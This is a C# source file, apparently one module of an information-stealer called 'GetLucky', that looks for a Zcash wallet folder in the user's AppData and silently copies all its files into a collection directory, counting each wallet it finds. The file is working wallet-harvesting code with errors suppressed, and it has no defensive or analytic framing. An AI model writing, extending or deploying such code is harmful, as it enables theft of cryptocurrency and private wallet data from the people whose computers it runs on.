using System.IO;

namespace GetLucky
{
    class Zcash
    {
        public static int count = 0;
        public static string ZcashDir = "\\Wallets\\Zcash\\";
        public static string ZcashDir2 = Help.AppDate + "\\Zcash\\";
        public static void ZecwalletStr(string directorypath)  // Works
        {
            try
            {
                if (Directory.Exists(ZcashDir2))
                {
                    foreach (FileInfo file in new DirectoryInfo(ZcashDir2).GetFiles())

                    {
                        Directory.CreateDirectory(directorypath + ZcashDir);
                        file.CopyTo(directorypath + ZcashDir + file.Name);
                    }
                    Wallets.count++;
                }
                else
                {
                    return;
                }

            }
            catch {}

        }
    }
}
